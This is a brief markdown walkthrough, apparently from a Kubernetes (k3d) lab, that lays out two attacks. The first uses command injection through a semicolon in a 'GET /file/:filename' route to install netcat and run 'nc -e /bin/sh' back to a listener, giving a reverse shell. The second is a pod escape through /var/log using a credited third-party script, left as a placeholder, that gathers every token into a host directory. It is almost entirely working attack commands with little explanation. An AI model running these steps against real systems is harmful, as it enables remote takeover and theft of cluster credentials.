# Reverse Shell

1 - On you host run the following command in a terminal
```bash
nc -lvp 4242
```

2 - Pass a reverse shell command after a semicolumn in the `GET /file/:filename` route, to execute these commands on the server:


```bash
apt update
apt install netcat-traditional

nc -e /bin/sh 172.17.0.1 4242
# 172.17.0.1 being my IP adress with k3d
```

3 - And tadaaa! You have a Reverse Shell on you host!


# Pod Escape through /var/log

> [!NOTE]
> Credits goes to [danielsagi](https://github.com/danielsagi/kube-pod-escape) for the exploit and the script

1 - On you host run the following command in a terminal
```bash
apt install python3 python3-pip python3-netifaces python3-requests python3-bs4

cat << 'EOF' > /get_host_files.py
<paste the contents of the python script>
EOF

python3 /get_host_files.py
```

And now every tokens are in the `host` directory 
